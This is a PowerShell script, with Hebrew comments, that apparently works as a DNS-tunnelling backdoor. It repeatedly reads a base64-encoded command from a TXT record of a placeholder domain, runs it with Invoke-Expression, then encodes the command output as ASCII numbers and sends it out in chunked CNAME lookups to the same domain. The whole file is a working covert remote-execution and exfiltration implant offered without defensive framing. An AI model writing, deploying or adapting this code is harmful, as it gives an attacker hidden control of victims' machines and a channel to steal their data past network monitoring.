$domain = "Your_DomainName.co.il" 

function Send-CnameQuery {
    param (
        [string]$data
    )
    if ($data.Length -gt 63) {
        Write-Output "Data too long for CNAME query: $data"
        return
    }
    try {
        nslookup -type=CNAME "$data.$domain" | Out-Null
        Write-Output "Sent CNAME query: $data"
    } catch {
        Write-Output "Failed to send CNAME query: $_"
    }
}


function Convert-ToFragmentedAscii {
    param (
        [string]$text
    )
    # ממיר טקסט לרצף מספרי ASCII מופרד במקפים
    $asciiArray = $text.ToCharArray() | ForEach-Object { [int][char]$_ }
    return ($asciiArray -join "-")
}

while ($true) {
    try {
        Write-Output "Querying TXT record..."
        $txtOutput = nslookup -type=TXT $domain | Out-String
        if ($txtOutput -match 'text\s*=\s*"(.*?)"') {
            $encodedCommand = $matches[1]
            $decodedCommand = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedCommand))
            Write-Output "Received Base64 command: $encodedCommand"
            Write-Output "Decoded command: $decodedCommand"

            Write-Output "Executing command..."
            $commandOutput = Invoke-Expression $decodedCommand 2>&1
            Write-Output "Command output: $commandOutput"

            $uniqueId = (Get-Date).ToString("yyyyMMddHHmmss")
            $fragmentedAscii = Convert-ToFragmentedAscii "$uniqueId|$commandOutput"

            # חלק את המחרוזת המפוצלת למקטעים של עד 40 תווים
            $chunks = $fragmentedAscii -split "(.{1,40})" | Where-Object { $_ -ne "" }
            $chunkCount = $chunks.Count

            Send-CnameQuery "$uniqueId-start"
            Start-Sleep -Milliseconds 500
            Send-CnameQuery "$uniqueId-$chunkCount-chunks"
            Start-Sleep -Milliseconds 500

            $chunkIndex = 1
foreach ($chunk in $chunks) {
    # Replace ASCII-related '-' with 'a' and clean up
    $chunk = $chunk -replace "-", "a"  # Replace ASCII-related dashes with 'a'
    $label = "$uniqueId-chunk$chunkIndex-$chunk"
    
    if ($label.Length -gt 63) {
        $chunk = $chunk.Substring(0, 63 - ($uniqueId.Length + 7))  # Trim if label exceeds 63 characters
        $label = "$uniqueId-chunk$chunkIndex-$chunk"
    }
    
    Send-CnameQuery $label
    Start-Sleep -Milliseconds 3000
    $chunkIndex++
}


            Send-CnameQuery "$uniqueId-end"
        } else {
            Write-Output "No TXT record found for command."
        }
    } catch {
        Write-Output "An error occurred: $_"
    }
    Start-Sleep -Seconds 25
}
